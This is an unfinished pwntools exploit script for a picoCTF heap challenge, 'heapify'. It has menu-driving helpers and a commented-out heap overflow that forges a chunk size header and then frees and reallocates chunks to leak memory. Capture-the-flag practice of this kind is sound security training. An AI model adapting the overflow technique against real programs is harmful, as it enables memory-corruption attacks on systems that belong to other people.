#!/usr/bin/env python3

from pwn import *

# thanks eth!!!

context.log_level='debug'
context.binary = elf = ELF("./heapify")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

#sock = conn = process('./heapify_patched')
#sock = conn = remote("tethys.picoctf.net", 57462)

#r = process('./heapify_patched')
r = gdb.debug('./heapify_patched', 'b *main+53\nc')

def alloc(data, sz):
    r.recvuntil(b': ')
    r.sendline(b'1')
    r.recvuntil(b': ')
    r.sendline(str(sz).encode())
    r.recvuntil(b': ')
    r.sendline(data)
    r.recvline()
def delete(i):
    r.recvuntil(b': ')
    r.sendline(b'2')
    r.recvuntil(b': ')
    r.sendline(str(i).encode())
def view(i):
    r.recvuntil(b': ')
    r.sendline(b'3')
    r.recvuntil(b': ')
    r.sendline(str(i).encode())

"""alloc(b'', 0x10)
alloc(b'a'*(0x400-16+0x8)+p64(0x940 | 0x1), 0x400-16)
alloc(b'', 0x1000)
alloc(b'', 0x8)
alloc(b'', 0x8)
delete(3)
alloc(b'a'*0x20+b'a',0x8)
view(4)"""

r.interactive()
